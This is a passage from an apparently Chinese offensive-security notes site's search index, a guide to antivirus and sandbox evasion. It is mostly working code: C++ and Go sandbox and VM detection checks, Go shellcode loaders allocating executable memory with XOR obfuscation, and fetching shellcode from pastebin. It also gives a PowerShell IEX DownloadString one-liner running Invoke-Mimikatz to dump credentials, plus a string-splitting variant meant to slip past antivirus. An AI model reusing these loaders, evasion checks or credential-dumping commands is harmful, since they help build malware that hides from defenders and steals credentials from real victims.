3.\u8fd0\u884c\u6076\u610f\u7a0b\u5e8f\u4e00\u6bb5\u65f6\u95f4\uff08\u4e00\u822c\u4e3a5\u5206\u949f\uff09 4.\u83b7\u53d6\u865a\u62df\u73af\u5883\u8fd4\u56de\u7684\u62a5\u544a 5.\u5173\u673a \u5168\u7a0b\u4e0d\u8fc76.7\u5206\u949f\uff0c\u800c\u6b63\u5e38\u7684\u673a\u5668\u8fd0\u884c\u65f6\u95f4\u80af\u5b9a\u662f\u5927\u4e8e\u8fd9\u4e2a\u503c\u7684\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9a\u4e00\u4e2a\u6807\u51c6\uff1a\u5982\u679cGetTickCount\u8fd4\u56de\u7684\u503c\u5c0f\u4e8e10min\uff0c\u90a3\u4e48\u5c31\u88ab\u5224\u4e3a\u6c99\u7bb1\u73af\u5883\u3002 CPU,RAM\u7b49\u4fe1\u606f \u6c99\u7bb1\u7684CPUI\u591a\u4e3a1\u6838\uff0cram\u591a\u5c0f\u4e8e2g\uff0c\u786c\u76d8\u5927\u5c0f\u591a\u5c0f\u4e8e100g\u3002\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u4e00\u4e2a\u57fa\u51c6\u8fdb\u884c\u6c99\u7bb1\u68c0\u6d4b\u3002 //cpu processors SYSTEM_INFO systeminfo; GetSystemInfo(&systeminfo); DWORD numberOfProcessors = systeminfo.dwNumberOfProcessors; //ram MEMORYSTATUSEX memoryStatus; memoryStatus.dwLength = sizeof(memoryStatus); GlobalMemoryStatusEx(&memoryStatus); DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024; //hdd(\u786c\u76d8\u5927\u5c0f) HANDLE hDevice = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); DISK_GEOMETRY pDiskGeometry; DWORD bytesReturned; DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL); DWORD diskSizeGB; diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024; printf(\"cpu:%d,ram:%d,size(gb):%d\", numberOfProcessors, RAMMB, diskSizeGB); mac \u5e38\u89c1\u865a\u62df\u673a\u5982vmware\uff0cviturl box\u7b49\u90fd\u6709\u7279\u6b8a\u7684mac\u5730\u5740\uff0c\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u4f9d\u636e\u5224\u65ad\u662f\u5426\u5728\u865a\u62df\u673a\u4e2d\uff08\u968f\u7740\u865a\u62df\u5316\u4e3b\u673a\u8d8a\u6765\u8d8a\u666e\u904d\uff0c\u8bb8\u591a\u516c\u53f8\u5c06\u4e1a\u52a1\u7cfb\u7edf\u4e5f\u642c\u8fdb\u4e86\u865a\u62df\u673a\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5df2\u4e0d\u592a\u80fd\u4f5c\u4e3a\u68c0\u6d4b\u6c99\u7bb1\u7684\u6307\u6807\uff09 \u201c\u901a\u5e38\uff0cMAC\u5730\u5740\u7684\u524d\u4e09\u4e2a\u5b57\u8282\u6807\u8bc6\u4e00\u4e2a\u63d0\u4f9b\u5546\u3002\u4ee500:05:69\u300100:0c:29\u548c00:50:56\u5f00\u59cb\u7684MAC\u5730\u5740\u4e0eVMware\u76f8\u5bf9\u5e94\uff1b\u4ee500:03:ff\u5f00\u59cb\u7684MAC\u5730\u5740\u4e0evirtualpc\u5bf9\u5e94\uff1b\u4ee508:00:27\u5f00\u59cb\u7684MAC\u5730\u5740\u4e0evirtualbox\u5bf9\u5e94\u3002\u201d string mac; get_3part_mac(mac); if (mac == \"00-05-69\" || mac == \"00-0c-29\" || mac == \"00-50-56\" || mac == \"00-03-ff\" || mac == \"08-00-27\") { } else { } void get_3part_mac(string &mac) { NCB Ncb; ASTAT Adapter; UCHAR uRetCode; LANA_ENUM lenum; memset(&Ncb, 0, sizeof(Ncb)); Ncb.ncb_command = NCBENUM; Ncb.ncb_buffer = (UCHAR *)&lenum; Ncb.ncb_length = sizeof(lenum); uRetCode = Netbios(&Ncb); for (int i = 0; i < lenum.length; i++) { memset(&Ncb, 0, sizeof(Ncb)); Ncb.ncb_command = NCBRESET; Ncb.ncb_lana_num = lenum.lana[i]; uRetCode = Netbios(&Ncb); memset(&Ncb, 0, sizeof(Ncb)); Ncb.ncb_command = NCBASTAT; Ncb.ncb_lana_num = lenum.lana[i]; strcpy((char *)Ncb.ncb_callname, \"*\"); Ncb.ncb_buffer = (unsigned char *)&Adapter; Ncb.ncb_length = sizeof(Adapter); uRetCode = Netbios(&Ncb); if (uRetCode == 0) { char tmp[128]; sprintf(tmp, \"%02x-%02x-%02x\", Adapter.adapt.adapter_address[0], Adapter.adapt.adapter_address[1], Adapter.adapt.adapter_address[2] ); mac = tmp; } } } \u5206\u8fa8\u7387 \u6c99\u7bb1\u7684\u5206\u8fa8\u7387\u90fd\u4e0d\u592a\u6b63\u5e38 \u68c0\u67e5\u65f6\u533a\u4e0e\u65f6\u95f4\u6d41\u52a8\u6027 \u6c99\u7bb1\u5f80\u5f80\u4f1a\u52a0\u901f\u8fd0\u884c\u6587\u4ef6\uff0c\u6545\u53ef\u4ee5\u68c0\u67e5\u65f6\u95f4\u6d41\u52a8\u6027\u662f\u5426\u6b63\u5e38\u4ece\u800c\u68c0\u6d4b\u6c99\u7bb1 //\u65f6\u533a DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo; GetDynamicTimeZoneInformation(&DynamicTimeZoneInfo); wchar_t wcTimeZoneName[128 + 1]; StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName); CharUpperW(wcTimeZoneName); if (!wcsstr(wcTimeZoneName, L\"CHINA STANDARD TIME\")) { } //\u6d41\u52a8\u6027 clock_t ClockStartTime, ClockEndTime; time_t UnixStartTime = time(0); ClockStartTime = clock(); Sleep(10000); ClockEndTime = clock(); time_t UnixEndTime = time(0); int iTimeDifference = ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime); if (iTimeDifference>150){ //*code } \u68c0\u6d4b\u6587\u4ef6\u540d\u662f\u5426\u88ab\u6c99\u7bb1\u66f4\u6539 wchar_t currentProcessPath[MAX_PATH + 1]; GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1); CharUpperW(currentProcessPath); if (!wcsstr(currentProcessPath, L\"evil.EXE\")) return false; Time-Based Evasion \u57fa\u4e8e\u65f6\u95f4\u7684\u89c4\u907f\u3002\u5373\u6076\u610f\u8f6f\u4ef6\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u8fd0\u884c\u540e\u5e76\u4e0d\u4f1a\u7acb\u523b\u8fdb\u884c\u6076\u610f\u884c\u52a8\uff0c\u800c\u662f\u4f1a\u4f2a\u88c5\u3001\u4f11\u7720\u4e00\u6bb5\u65f6\u95f4\uff0c\u7b49\u5230\u4e00\u5b9a\u65f6\u95f4\u540e\u518d\u5f00\u59cb\u6076\u610f\u884c\u52a8 \u4f7f\u7528\u7f51\u7edc\u8fde\u63a5\u5b9e\u65f6\u8bfb\u53d6\u542f\u52a8\u6307\u4ee4 \u610f\u601d\u5c31\u662f\u8bf4\u8be5\u7a0b\u5e8f\u4f1a\u4e0d\u65ad\u5411\u67d0\u4e2a\u7f51\u5740\u53d1\u9001\u8bf7\u6c42\u5305\uff0c\u5982\u679c\u7f51\u5740\u8fd4\u56de\u4e86\u5bf9\u5e94\u7684\u542f\u52a8\u6307\u4ee4\u5219\u5f00\u59cb\u8c03\u7528\u6076\u610f\u4ee3\u7801\u3002 \u4e0b\u56fe\u662f\u7528HTTP\u8bf7\u6c42\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\u7684\u4ee3\u7801\u3002 HINTERNET hSession = WinHttpOpen(L\"Mozilla 5.0\", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0); HINTERNET hConnection = WinHttpConnect(hSession, L\"www.baidu.com\", INTERNET_DEFAULT_HTTP_PORT, 0); HINTERNET hRequest = WinHttpOpenRequest(hConnection, L\"GET\", L\"\", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL); WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); WinHttpReceiveResponse(hRequest, 0); DWORD responseLength; WinHttpQueryDataAvailable(hRequest, &responseLength); PVOID response = new char[responseLength + 1]; WinHttpReadData(hRequest, response, responseLength, &responseLength); std::cout << ((char *)response); User Activity Based Checks \u901a\u8fc7\u68c0\u6d4b\u4e00\u4e9b\u884c\u4e3a\uff0c\u6765\u8bc6\u522b\u5f53\u524d\u5b9e\u65bd\u8005\u662f\u5426\u4e3a\u4eba\u7c7b\u3002\uff08\u6bd4\u5982\u52a8\u9f20\u6807\uff0c\u6572\u952e\u76d8\u7b49\uff0c\u6216\u8005\u67e5\u8be2\u7535\u8111\u4e0aword\u6587\u6863\u6253\u5f00\u5386\u53f2\u6570\uff0cchrome\u5386\u53f2\u8bb0\u5f55\u7b49\u4fe1\u606f\u6765\u5224\u65ad\uff09 \u9f20\u6807\u79fb\u52a8\u8f68\u8ff9 \u53ef\u4ee5\u8bbe\u7f6e\u9f20\u6807\u79fb\u52a8\u591a\u5c11\u8ddd\u79bb\u624d\u6267\u884cshellcode\uff0c\u6c99\u7bb1\u6709\u4e9b\u662f\u6ca1\u6709\u9f20\u6807\u7684\u3002 POINT CurrentMousePos; POINT PreviousMousePos; GetCursorPos(&PreviousMousePos); double Dis = 0; while (true) { GetCursorPos(&CurrentMousePos); Dis+= sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2)); Sleep(100); if (Dis > 20000) { //*code } } \u68c0\u6d4b\u7236\u8fdb\u7a0b \u5bf9\u4e8e\u4e00\u4e2a\u6b63\u5e38\u7684\u7528\u6237\u6765\u8bf4\uff0c\u542f\u52a8exe\u6587\u4ef6\u5e94\u8be5\u662f\u53cc\u51fb\u8fd0\u884c\uff0c\u7a0b\u5e8f\u542f\u52a8\u540e\u7236\u8fdb\u7a0b\u662fexplore.exe\uff0c\u5982\u679c\u662fcmd\u8fd0\u884c\u5219\u4f1a\u662fcmd.exe\u3001 \u4f46\u662f\u5bf9\u4e8e\u6c99\u7bb1\u5c31\u6709\u53ef\u80fd\u5b58\u5728\u7528\u4e00\u4e2a\u7a0b\u5e8f\u5982windbg\u6765\u542f\u52a8\u6211\u4eec\u7684\u6076\u610fEXE\u6587\u4ef6\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5bf9\u6b64\u70b9\u8fdb\u884c\u68c0\u6d4b\u3002 DWORD GetParentPID(DWORD pid) { DWORD ppid = 0; PROCESSENTRY32W processEntry = { 0 }; processEntry.dwSize = sizeof(PROCESSENTRY32W); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //\u5bf9\u6240\u6709\u8fdb\u7a0b\u521b\u5efa\u5feb\u7167 if (Process32FirstW(hSnapshot, &processEntry)) //\u904d\u5386\u5feb\u7167\uff0c\u627e\u5230\u5f53\u524d\u4f20\u5165PID\u7684\u8fdb\u7a0b\u4fe1\u606f { do { if (processEntry.th32ProcessID == pid) { ppid = processEntry.th32ParentProcessID; //\u627e\u5230\u5e76\u8fd4\u56de\u4f20\u5165PID\u7684\u7236\u8fdb\u7a0bPID break; } } while (Process32NextW(hSnapshot, &processEntry)); } CloseHandle(hSnapshot); return ppid; } void main() { DWORD parentPid = GetParentPID(GetCurrentProcessId()); //\u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7236\u8fdb\u7a0bPID WCHAR parentName[MAX_PATH + 1]; DWORD dwParentName = MAX_PATH; HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid); //\u6253\u5f00\u7236\u8fdb\u7a0b QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot' //\u83b7\u53d6\u8fdb\u7a0b\u540d CharUpperW(parentName); if (wcsstr(parentName, L\"WINDBG.EXE\")) return; //\u5339\u914d wprintf_s(L\"Now hacking...\\n\"); } \u8fdb\u7a0b\u9542\u7a7a \u52a8\u6001\u8c03\u7528API typedef LPVOID(WINAPI* ImportVirtualAlloc)( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); unsigned char buf[] = \"shellcode\"; ImportVirtualAlloc a = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"VirtualAlloc\"); a(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Powershell \u8fdc\u7a0b\u6267\u884c\u4e0e\u672c\u5730\u6267\u884c \u8fdc\u7a0b\u6267\u884c powershell\u53ef\u4ee5\u52a0\u8f7d\u8fdc\u7a0b\u7684ps1\u6587\u4ef6\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u5b9e\u73b0\u4e86\u65e0\u6587\u4ef6\u843d\u5730\u3002 powershell \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\" \u4e0d\u8fc7\u5e02\u9762\u4e0a\u5f88\u591a\u6740\u8f6f\u5bf9downloadstring\u68c0\u6d4b\u5341\u5206\u5341\u5206\u4e25\u683c(\u8bb8\u591a\u4f1a\u68c0\u6d4b\u8fdc\u7a0b\u6587\u4ef6\u5b89\u5168\u6027\uff09 powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb) \u672c\u5730\u6267\u884c powershell Import-Module .\\xx.ps1 \u547d\u4ee4\u62c6\u5206 \u5c31\u50cf\u521a\u521a\u8fdc\u7a0b\u52a0\u8f7d\u7684downloadstring\u6cd5\uff0c\u5b83\u5f88\u5bb9\u6613\u88ab\u6740\u8f6f\u62e6\u622a\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u62c6\u5206\u91cd\u7ec4\u7ed5\u8fc7\u4e00\u4e9b\u6740\u8f6f\u68c0\u6d4b\u3002 powershell -c \"$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://webserver/xxx.ps1'')'.Replace('123','adString');IEX ($c1+$c2)\" GO FUNNY \u5f88\u6709\u8da3\u7684\u4e00\u4ef6\u4e8b\u662f\uff0c\u7528go\u8bed\u8a00\u5199\u4e2ahelloworld\u4f20\u5230vt\u88ab14\u5bb6\u6740,\u725b\u6279 \u751f\u6210EXE go \u7f16\u8bd1\u4e3aEXE \u7684\u505a\u6cd5\u662f go build ....go\uff0c\u4f46\u8fd9\u6837EXE\u6253\u5f00\u65f6\u4f1a\u6709\u4e2a\u9ed1\u6846 go build -ldflags \"-H windowsgui\" ..go \u751f\u6210\u65e0\u7a97\u53e3EXE\uff0c\u4f46\u8fd9\u6837\u4f1a\u589e\u52a0\u6740\u8f6f\u7684\u67e5\u6740\u5ea6 \u7533\u8bf7\u5185\u5b58\u52a0\u8f7dshellcode package main import ( \"syscall\" \"unsafe\" ) const ( MEM_COMMIT = 0x1000 MEM_RESERVE = 0x2000 PAGE_EXECUTE_READWRITE = 0x40 // \u533a\u57df\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u8bfb\u5199\u8be5\u533a\u57df\u3002 KEY_1 = 55 KEY_2 = 66 ) var ( kernel32 = syscall.MustLoadDLL(\"kernel32.dll\") ntdll = syscall.MustLoadDLL(\"ntdll.dll\") VirtualAlloc = kernel32.MustFindProc(\"VirtualAlloc\") RtlCopyMemory = ntdll.MustFindProc(\"RtlCopyMemory\") ) func main(){ shellcode:=[]byte{0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d} addr,_,err:=VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE ) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode))) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } syscall.Syscall(addr, 0, 0, 0, 0) } \u6700\u539f\u59cb\u7248\u672c,\u88ab\u6740\u6210\u54c8\u6279\uff0c\u4f46\u5373\u4f7f\u8fd9\u6837360\u4e5f\u6740\u4e0d\u51fa\u6765\uff0c\u53ef\u4ee5\u770b\u51fa\u7ed5\u8fc7360\u6709\u624b\u5c31\u884c \u7b80\u5355XOR xor\u6a21\u5757\uff08\u83b7\u5f97xor\u540e\u7684shellcode\uff09 for i:=0;i<len(shellcode);i++{ fmt.Print(\"0x\",strconv.FormatInt(int64(shellcode[i]^123),16),\",\") } xor_shellcode:=[]byte{xored_shellcode} var shellcode []byte for i:=0;i<len(xor_shellcode);i++{ shellcode=append(shellcode,xor_shellcode[i]^123) } addr,_,err:=VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE ) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode))) if err != nil && err.Error() != \"The operation completed successfully.\" { syscall.Exit(0) } syscall.Syscall(addr, 0, 0, 0, 0) \u597d\u4e86\u70b9\uff0c\u4f46\u662f\u5982\u679c\u52a0\u4e0a\u65e0\u6846\u542f\u52a8\uff0c\u8fd8\u662f\u4f1a\u88ab\u6740\u6210\u54c8\u6279 \u6c99\u76d2&\u865a\u62df\u673a\u68c0\u6d4b imoprt{ \"github.com/shirou/gopsutil/host\" \"github.com/shirou/gopsutil/mem\" \"github.com/shirou/gopsutil/disk\" } func CheckTime() bool{ timeBoot, _ := host.BootTime() t := time.Unix(int64(timeBoot), 0) timeNow:=time.Now() ts:=timeNow.Sub(t) if ts.Minutes()<12{ return false }else{ return true } } func CheckName() bool{ files, _ := ioutil.ReadDir(\"./\") for _, f := range files { if f.Name()==\"ActiveX.exe\"{ return true } } return false } func CheckSystem() bool{ info1,_:=mem.SwapMemory() info2,_:=mem.VirtualMemory() disk,_:=disk.Usage(\"c:\") if(runtime.NumCPU()<2&&info1.Total<2147483648&&info2.Total<2147483648&&disk.Total<21474836480){ return false } return true } \u7528\u5b83\u548cXOR\u6253\u7ec4\u5408\u62f3\u6548\u679c\u5c06\u5c31\uff0c\u7528\u4e86\u65e0\u7a97\u542f\u52a8\u540e\u67097\u4e2a\u67e5\u51fa\u6765 \u865a\u62df\u673a\uff1a\u654f\u611f\u6587\u4ef6\u68c0\u6d4b \u8fd9\u4e2a\u4f1a\u88abdefender\u62e6\uff0c\u4e0d\u5fc5\u8981\u7684\u8bdd\u4e0d\u7528\u8fd9\u4e2a func PathExists(path string) (bool, error) { //\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728 _, err := os.Stat(path) if err == nil { return true, nil } if os.IsNotExist(err) { return false, nil } return false, err } func fack(path string) { //\u5224\u65ad\u865a\u62df\u673a\u5173\u952e\u6587\u4ef6\u662f\u5426\u5b58\u5728 b, _ := PathExists(path) if b { fmt.Printf(\"\u5f53\u524d\u662f\u865a\u62df\u673a\u73af\u5883\uff0c\u522b\u5206\u6790\u4e86\uff0c\u54e5\u3002\") os.Exit(1) //\u5982\u679c\u662f\u865a\u62df\u673a\u5c31\u9000\u51fa\u5f53\u524d\u8fdb\u7a0b } } func check() { fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\Vmmouse.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmtray.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VMToolsHook.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmmousever.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmhgfs.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\vmGuestLib.dll\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxMouse.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxGuest.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxSF.sys\") fack(\"C:\\\\windows\\\\System32\\\\Drivers\\\\VBoxVideo.sys\") fack(\"C:\\\\windows\\\\System32\\\\vboxdisp.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxhook.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxoglerrorspu.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxoglpassthroughspu.dll\") fack(\"C:\\\\windows\\\\System32\\\\vboxservice.exe\") fack(\"C:\\\\windows\\\\System32\\\\vboxtray.exe\") fack(\"C:\\\\windows\\\\System32\\\\VBoxControl.exe\") } \u8fdc\u7a0b\u8bfbshellcode Url,err:=url.Parse(\"https://pastebin.com/aa\") if err!=nil{ panic(\"error\") } client:=http.Client{} req,_:=http.NewRequest(\"GET\",Url.String(),nil) req.Header.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\") req.Header.Add(\"Cookie\",\"SUB=_2 SUBP=00\") resp,_:=client.Do(req) body,_:=ioutil.ReadAll(resp.Body) //string\u5f62\u5f0f\u83b7\u53d6\u4e86\u9875\u9762\u5185\u5bb9,\u4ee5\u4e0a\u4ee3\u7801\u4e3a\u4e3b\u4f53\u90e8\u5206 //\u901a\u8fc7\u4e00\u7cfb\u5217\u6b63\u5219\u5339\u914d,\u5b57\u7b26\u4e32\u622a\u53d6\u7b49\u65b9\u6cd5\u4ece\u9875\u9762\u4e2d\u5f97\u5230shellcode(\u9875\u9762\u4e2d\u6211\u7684shellcode\u662f\u8fd9\u6837\u7684rngrngfc,48,....,aalgdlgd) re:=regexp.MustCompile(`rngrng.*lgdlgd`) match:=re.FindString(string(body)) match=match[6:len(match)-6] return match \u4f46\u662f\u62d6\u4e0b\u6765\u7684shellcode\u662fstring\u683c\u5f0f\uff0c\u6211\u4eec\u9700\u8981\u628a\u4ed6\u8f6c\u4e3a[]byte func aa(encodes string) []byte{ var xor_shellcode []byte spi:=\",\" enc:=strings.Split(encodes,spi) for i,_ :=range enc{ tmps,_:=hex.DecodeString(enc[i]) if(len(tmps)>0) { xor_shellcode = append(xor_shellcode, tmps[0]) } } return xor_shellcode } \u8fdc\u7a0b+XOR+\u6c99\u7bb1 \u53cd\u800c\u88ab\u6740\u7684\u66f4\u591a...\u770b\u6765\u8fd9\u4e2aHTTP\u51fd\u6570\u88ab\u6293\u7684\u5f88\u7d27\uff0c\u8fd8\u88ab360\u6740\u51fa\u6765\u4e86 \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684SHELLCODE var sc []byte bytes,_:=ioutil.ReadFile(\"C:\\\\Users\\\\xx\\\\Desktop\\\\sc.txt\") tmp:=strings.Split(string(bytes),\",\") for i,_ :=range tmp{ tmps,_:=hex.DecodeString(tmp[i]) if(len(tmps)>0) { sc = append(sc, tmps[0]) } } \u53ef\u4ee5 \u6587\u4ef6\u91ca\u653e \u5728\u6211\u4eec\u6728\u9a6c\u8fd0\u884c\u65f6\u53ef\u4ee5\u91ca\u653e\u4e00\u4e2a\u6b63\u5e38\u6587\u4ef6\u5e76\u8fd0\u884c\uff0c\u8fbe\u5230DLL\u52ab\u6301\u6216\u8005\u8ff7\u60d1\u89c6\u542c\u7684\u4f5c\u7528\u3002 \u83b7\u53d6\u6587\u4ef6\u5185\u5bb9 file,_:=os.Open(\"E:\\\\tools\\\\shell\\\\cobaltstrike4.3\\\\cobaltstrike.exe\") fi,_:=file.Stat() size:=fi.Size() data := make([]byte, size) file.Read(data) for _,i:=range data{ fmt.Print(strconv.Itoa(int(i))+\",\") } \\","title":"\u57fa\u7840\u514d\u6740\u624b\u6cd5\u66b4\u98ce\u5438\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_1","text":"","title":"\u57fa\u7840\u514d\u6740\u624b\u6cd5\u66b4\u98ce\u5438\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/#_2","text":"EXE \u52a0\u58f3 \u6dfb\u52a0\u6570\u5b57\u7b7e\u540d \u95f4\u63a5\u8fd0\u884cexe forfiles pcalua cmd Hijack conhost explorer.exe C++ shellcode\u5904\u7406 \u6307\u9488\u6267\u884c+\u7533\u8bf7\u5185\u5b58\u52a8\u6001\u52a0\u8f7dshellcode \u5185\u8054\u6c47\u7f16\u52a0\u8f7dshellcode \u521b\u5efa\u7ebf\u7a0b\u6267\u884cshellcode \u4f7f\u7528\u8f85\u52a9\u5806\u6808\u52a0\u8f7dshellcode HTTP\u534f\u8bae\u8fdc\u7a0b\u8bfb\u53d6shellcode \u4f7f\u7528\u56de\u8c03\u51fd\u6570\u52a0\u8f7dshellcode \u4f7f\u7528\u52a0\u8f7d\u5668\u52a0\u8f7dshellcode shellcode_ launcher \u52a0\u8f7d\u5668 SSI \u52a0\u8f7d\u5668 \u81ea\u5199\u52a0\u8f7d\u5668 shellcode\u53d8\u5f62 UUID\u53d8\u5f62 shellcode\u6ce8\u5165\u8fdb\u7a0b\u5185\u5b58 \u6ce8\u5165\u5df2\u6709\u8fdb\u7a0b \u53cd\u8c03\u8bd5 \u76f4\u63a5\u5224\u65ad\u662f\u5426\u4e3a\u8c03\u8bd5\u72b6\u6001 \u68c0\u6d4b\u8f6f\u4ef6\u65ad\u70b9 \u65f6\u95f4\u68c0\u6d4b \u68c0\u6d4b\u7236\u8fdb\u7a0b SEH\u4e2d\u65ad \u6c99\u7bb1\u7ed5\u8fc7\uff08Sandbox Evasion\uff09 System Checks \u68c0\u6d4b\u51fd\u6570\u662f\u5426\u88abHOOK\u66f4\u6539 GetTickCount CPU,RAM\u7b49\u4fe1\u606f mac \u5206\u8fa8\u7387 \u68c0\u67e5\u65f6\u533a\u4e0e\u65f6\u95f4\u6d41\u52a8\u6027 \u68c0\u6d4b\u6587\u4ef6\u540d\u662f\u5426\u88ab\u6c99\u7bb1\u66f4\u6539 Time-Based Evasion \u4f7f\u7528\u7f51\u7edc\u8fde\u63a5\u5b9e\u65f6\u8bfb\u53d6\u542f\u52a8\u6307\u4ee4 User Activity Based Checks \u9f20\u6807\u79fb\u52a8\u8f68\u8ff9 \u68c0\u6d4b\u7236\u8fdb\u7a0b \u8fdb\u7a0b\u9542\u7a7a \u52a8\u6001\u8c03\u7528API Powershell \u8fdc\u7a0b\u6267\u884c\u4e0e\u672c\u5730\u6267\u884c \u8fdc\u7a0b\u6267\u884c \u672c\u5730\u6267\u884c \u547d\u4ee4\u62c6\u5206 GO FUNNY \u751f\u6210EXE \u7533\u8bf7\u5185\u5b58\u52a0\u8f7dshellcode \u7b80\u5355XOR \u6c99\u76d2&\u865a\u62df\u673a\u68c0\u6d4b \u865a\u62df\u673a\uff1a\u654f\u611f\u6587\u4ef6\u68c0\u6d4b \u8fdc\u7a0b\u8bfbshellcode \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684SHELLCODE \u6587\u4ef6\u91ca\u653e 